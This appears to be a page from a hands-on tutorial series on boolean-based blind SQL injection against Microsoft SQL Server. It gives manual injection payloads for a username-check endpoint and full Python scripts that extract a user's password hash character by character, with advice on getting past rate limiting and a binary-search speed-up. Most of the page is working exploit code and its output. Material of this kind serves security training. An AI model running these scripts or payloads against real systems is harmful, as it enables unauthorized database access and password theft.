# 📤 Extracting Data

## Overview

With a working oracle, we can extract data character by character.

**Process**:
1. Find password length
2. Extract each character using ASCII values
3. Reconstruct the full value

---

## Step 1: Finding the Length

Use `LEN(string)` to find password length:

```python
# Get the target's password length
length = 0

# Loop until the value of `length` matches `LEN(password)`
while not oracle(f"LEN(password)={length}"):
    length += 1

print(f"[*] Password length = {length}")
```

### Output

```bash
$ python poc.py
[*] Password length = 32
```

---

## Step 2: Extracting Characters

### SQL Functions Used

| Function | Purpose | Example |
|----------|---------|---------|
| `SUBSTRING(expr, start, len)` | Extract character at position | `SUBSTRING(password, 1, 1)` |
| `ASCII(char)` | Convert character to decimal | `ASCII('A')` = 65 |

### Query Structure

```sql
ASCII(SUBSTRING(password, N, 1)) = C
```

Where:
- `N` = character position (1-indexed)
- `C` = ASCII decimal value to test

---

## Manual Testing

### Test Position 1, ASCII 0

**Payload**:
```sql
maria' AND ASCII(SUBSTRING(password,1,1))=0-- -
```

**Response**: `available` (False) - Character is NOT ASCII 0

### Test Position 1, ASCII 57 ('9')

**Payload**:
```sql
maria' AND ASCII(SUBSTRING(password,1,1))=57-- -
```

**Response**: `taken` (True) - First character IS '9'!

---

## ASCII Reference

### Printable Range

| Range | Characters |
|-------|------------|
| 32-47 | Space, punctuation |
| 48-57 | **0-9** (digits) |
| 65-90 | **A-Z** (uppercase) |
| 97-122 | **a-z** (lowercase) |
| 123-126 | Brackets, symbols |

> 💡 **Tip**: For hashes, focus on 48-57 (0-9) and 97-102 (a-f) for hex characters.

---

## Automated Extraction Script

```python
#!/usr/bin/env python3
import requests
import json
import sys
from urllib.parse import quote_plus

target = "maria"

def oracle(query):
    payload = quote_plus(f"{target}' AND ({query})-- -")
    response = requests.get(f"http://<TARGET>/api/check-username.php?u={payload}")
    jsonResponse = json.loads(response.text)
    return jsonResponse['status'] == 'taken'

# Step 1: Find password length
length = 0
while not oracle(f"LEN(password)={length}"):
    length += 1
print(f"[*] Password length = {length}")

# Step 2: Extract password character by character
print("[*] Password = ", end='')

for i in range(1, length + 1):
    # Loop through printable ASCII characters (32-126)
    for c in range(32, 127):
        if oracle(f"ASCII(SUBSTRING(password,{i},1))={c}"):
            print(chr(c), end='')
            sys.stdout.flush()
            break  # Found character, move to next position

print()
```

---

## Full Working Script

```python
#!/usr/bin/env python3
import requests
import json
import sys
import time
from urllib.parse import quote_plus

target = "maria"

def oracle(query):
    payload = quote_plus(f"{target}' AND ({query})-- -")
    response = requests.get(f"http://<TARGET>/api/check-username.php?u={payload}")
    jsonResponse = json.loads(response.text)
    return jsonResponse['status'] == 'taken'

# Known password length (or calculate dynamically)
passwordLength = 32

print("Password: ", end='')

for i in range(1, passwordLength + 1):
    for character in range(0, 128):
        if oracle(f"ASCII(SUBSTRING(password, {i}, 1)) = {character}"):
            print(chr(character), end='')
            sys.stdout.flush()
            break

print()
```

### Output

```bash
$ python3 oracle.py
Password: 9c6f8704f305b22c538c14207650ccda
```

---

## Troubleshooting

### Script Fails / Incomplete Results

**Solution 1**: Reset target machine and retry

**Solution 2**: Add delay between requests

```python
import time

def oracle(query):
    payload = quote_plus(f"{target}' AND ({query})-- -")
    response = requests.get(f"http://<TARGET>/api/check-username.php?u={payload}")
    time.sleep(0.5)  # Add 500ms delay
    jsonResponse = json.loads(response.text)
    return jsonResponse['status'] == 'taken'
```

### Rate Limiting

If getting blocked, increase delay:

```python
time.sleep(2)  # 2 second delay
```

---

## Performance Analysis

### Worst Case (Linear Search)

| Password Length | ASCII Range | Max Requests |
|-----------------|-------------|--------------|
| 32 chars | 0-127 | 32 × 128 = **4,096** |
| 32 chars | 32-126 (printable) | 32 × 95 = **3,040** |
| 32 chars | hex only (0-9, a-f) | 32 × 16 = **512** |

### Time Estimation

At 100ms per request:
- 4,096 requests ≈ **6.8 minutes**
- 512 requests ≈ **51 seconds**

---

## Optimizations Preview

### Binary Search

Instead of linear (0,1,2...127), use binary search:

```python
def find_char(position):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        if oracle(f"ASCII(SUBSTRING(password,{position},1))>{mid}"):
            low = mid + 1
        else:
            high = mid
    return chr(low)
```

**Complexity**: 7 requests per character instead of ~64 average!

---

## Next Steps

- [Optimizing Extraction](optimizing.md) - Binary search, threading
- [Time-Based SQLi](time-based.md) - When boolean-based doesn't work

---

## Quick Reference

### Key Functions (MSSQL)

```sql
LEN(string)                    -- String length
SUBSTRING(string, start, len)  -- Extract substring
ASCII(char)                    -- Character to ASCII value
CHAR(ascii)                    -- ASCII value to character
```

### Extraction Template

```sql
ASCII(SUBSTRING(<column>, <position>, 1)) = <ascii_value>
```

